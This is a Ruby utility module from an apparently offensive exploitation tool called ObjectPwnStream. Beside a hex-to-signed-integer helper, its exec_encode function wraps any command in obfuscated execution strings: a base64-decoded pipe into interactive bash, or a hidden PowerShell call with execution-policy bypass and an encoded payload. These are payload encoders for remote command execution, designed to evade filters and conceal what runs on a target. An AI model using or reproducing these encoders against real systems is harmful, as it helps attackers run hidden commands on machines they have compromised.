module ObjectPwnStream
  module Utils
    def to_signed(hex)
      # from: https://www.ruby-forum.com/t/question-about-hex-signed-int/125510/4
      int = (hex.to_i(16) if hex.is_a? String) || hex
      length = 32
      mid = 2**(length-1)
      max_unsigned = 2**length
      (int>=mid) ? int - max_unsigned : int
    end

    def exec_encode(cmd, windows: false)
      !windows ?
        "bash -c {echo,#{[cmd].pack('m0')}}|{base64,-d}|{bash,-i}"
        :
        "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc #{[cmd.chars.zip([[0].pack("C")]*cmd.length)*""].pack("m0")}"
    end

    module_function :exec_encode
    module_function :to_signed
  end
end